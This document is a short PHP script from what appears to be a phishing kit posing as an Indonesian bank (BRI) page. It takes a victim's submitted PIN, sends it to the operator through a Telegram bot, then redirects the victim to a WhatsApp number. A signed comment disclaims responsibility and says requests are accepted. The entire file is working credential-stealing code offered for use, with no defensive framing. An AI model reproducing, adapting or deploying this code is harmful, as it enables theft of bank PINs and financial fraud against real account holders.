

<html>
<head>
<meta http-equiv="REFRESH" content="0;url=sms.php">
</head>
<body>
</body>
</html>
<?php
$setPin = $_POST['setPin'];
function sendMessage($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
}
include 'mailman.php';
$pesantelegram = <<<EOD
BRI Notif 
------------------------
PIN : $setPin
EOD;
    sendMessage($telegram_id, $pesantelegram, $secret_token);
    header('location:https://api.whatsapp.com/send?phone=6281289916485&text=&source=&data=&app_absent=  ');
    // Copyright By Pache_Boss22
    // Menerima Request Dan tidak bertanggung jawab atas sesuatu yang merugikan anda atau orang lain
